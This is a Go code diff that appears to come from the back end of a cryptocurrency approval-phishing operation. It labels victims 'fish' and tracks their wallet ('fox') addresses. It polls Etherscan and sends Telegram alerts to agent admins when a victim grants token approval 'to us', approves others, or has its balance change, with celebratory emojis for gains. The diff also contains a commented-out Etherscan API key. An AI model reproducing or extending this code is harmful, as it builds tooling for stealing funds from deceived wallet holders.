@@ -22,6 +22,7 @@ import (
 	token "github.com/wangyi/fishpond/eth"
 	"io/ioutil"
 	"log"
+	"math"
 	"math/big"
 	"strconv"
 	"strings"
@@ -154,12 +155,28 @@ func UpdateUsdAndEth(foxAddress string, Db *gorm.DB, money float64, fishID int, 
 	data["money_eth"], _ = eth.Float64()
 
 	b, _ := strconv.ParseFloat(usd.String(), 64)
-	if money != b {
-		a := money - b
+	if math.Abs(money-b) > 2 {
+		a := b - money
 		c := strconv.FormatFloat(a, 'f', 2, 64)
 		fishIDY := strconv.Itoa(fishID)
 		e := strconv.FormatFloat(money, 'f', 2, 64)
-		content := "[钱包余额变动报警] 编号: [" + fishIDY + "] 用户备注 [" + remark + "],余额减少(增加):" + c + " 原来余额: " + e + " 现在余额: " + usd.String() + "时间: " + time.Now().Format("2006-01-02 15:04:05")
+		var p string
+		if a > 0 {
+			p = " 😄😄😄"
+		} else {
+			p = " 😭😭😭"
+		}
+
+		admin := Admin{}
+		Db.Where("id=?", Aid).First(&admin)
+		content := "❥【钱包余额变动报警】------------------------------------------------->%0A" +
+			" 用户备注: [" + remark + "] " + "%0A" +
+			" 用户编号:[ 11784374" + fishIDY + "] " + "%0A" +
+			" 余额变动: " + c + "%0A" +
+			" 原来余额: " + e + "%0A" +
+			" 当前余额: " + usd.String() + "%0A" +
+			"所属代理ID:" + admin.Username + "%0A" +
+			" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + p
 		NotificationAdmin(Db, Aid, content)
 	}
 
@@ -233,16 +250,38 @@ type Fish struct {
 	InComeTimes            int `gorm:"int(10);default:1"` //发送收益次数
 }
 
+type Admin struct {
+	ID                   uint   `gorm:"primaryKey;comment:'主键'"`
+	Username             string `gorm:"varchar(225)"`
+	Password             string `gorm:"varchar(225)"`
+	Token                string `gorm:"varchar(225)"`
+	Level                int    `gorm:"int(10);default:0"`
+	Status               int    `gorm:"int(10);default:1"`
+	Ip                   string `gorm:"varchar(225)"`
+	TheOnlyInvited       string //唯一邀请码
+	Updated              int64
+	Created              int64
+	Belong               int
+	ServiceAddress       string `gorm:"type:text"` //客服地址
+	ServiceAddressSwitch int
+	InComeTimes          int    `gorm:"int(10);default:1"` //发送收益次数
+	TelegramToken        string //小飞机的token
+	TelegramChatId       string //小飞机的聊天ID
+	LongUrl              string
+}
+
 func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string, Db *gorm.DB) {
 
 	//获取 要查询的 fish
 	//apiKey := "5YJ37XCEQFSEDMMI6RXZ756QB7HS2VT921"
 	res, err := http.Get("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
 	if err != nil {
+		fmt.Println(err.Error())
 		return
 	}
 	body, err1 := ioutil.ReadAll(res.Body)
 	if err1 != nil {
+		fmt.Println(err1.Error())
 		return
 	}
 
@@ -251,6 +290,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 	var data TxList
 	err = json.Unmarshal([]byte(string(body)), &data)
 	if err != nil {
+		fmt.Println(err.Error())
 		return
 	}
 	var count int = 0
@@ -271,14 +311,20 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 						count++
 						ifCount = false
 					}
-
 					fish := Fish{}
 					err := Db.Where("fox_address=?", foxAddress).First(&fish).Error
 					if err == nil {
 						//  新增授权
-						fishID := strconv.Itoa(int(fish.ID))
-						content := "[新增授权报警] 编号: [" + fishID + "] 已经授权,时间: " + time.Now().Format("2006-01-02 15:04:05")
-						NotificationAdmin(Db, fish.AdminId, content)
+						if fish.Authorization == 1 {
+							fishID := strconv.Itoa(int(fish.ID))
+							admin := Admin{}
+							Db.Where("id=?", fish.AdminId).First(&admin)
+							content := "❥【授权给我们报警!!】---------------------------------------------------->%0A" +
+								" 用户编号: [ 11784374" + fishID + "] " + "已授权给我们%0A" +
+								"所属代理ID:" + admin.Username + "%0A" +
+								" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "👏👏👏️"
+							NotificationAdmin(Db, fish.AdminId, content)
+						}
 					}
 
 					mapData := make(map[string]interface{})
@@ -299,8 +345,21 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 				//  新增授权
 				people := strconv.Itoa(count)
 				fishID := strconv.Itoa(int(fish.ID))
-				content := "[授权他人报警] 编号: [" + fishID + "] 用户备注 [" + fish.Remark + "],授权给他人,当前授权人数为:" + people + " 时间: " + time.Now().Format("2006-01-02 15:04:05")
-				NotificationAdmin(Db, fish.AdminId, content)
+				//content := "[授权他人报警] 编号: [" + fishID + "] 用户备注 [" + fish.Remark + "],授权给他人,当前授权人数为:" + people + " 时间: " + time.Now().Format("2006-01-02 15:04:05")
+				//adminString := strconv.Itoa(fish.AdminId)
+				admin := Admin{}
+				Db.Where("id=?", fish.AdminId).First(&admin)
+				if fish.AuthorizationTime != count {
+					content := "❥【授权他人报警】-------------------------------------------------->%0A" +
+						" 用户编号: [ 11784374" + fishID + "] " + "授权给他人%0A" +
+						" 用户备注: [" + fish.Remark + "] " + "%0A" +
+						"所属代理ID:" + admin.Username + "%0A" +
+						" 当前授权人数: [" + people + "] " + "%0A" +
+						" 时间: " + time.Now().Format("2006-01-02 15:04:05")+ "%0A" + "😱😱😱"
+
+					NotificationAdmin(Db, fish.AdminId, content)
+				}
+
 			}
 		}
 
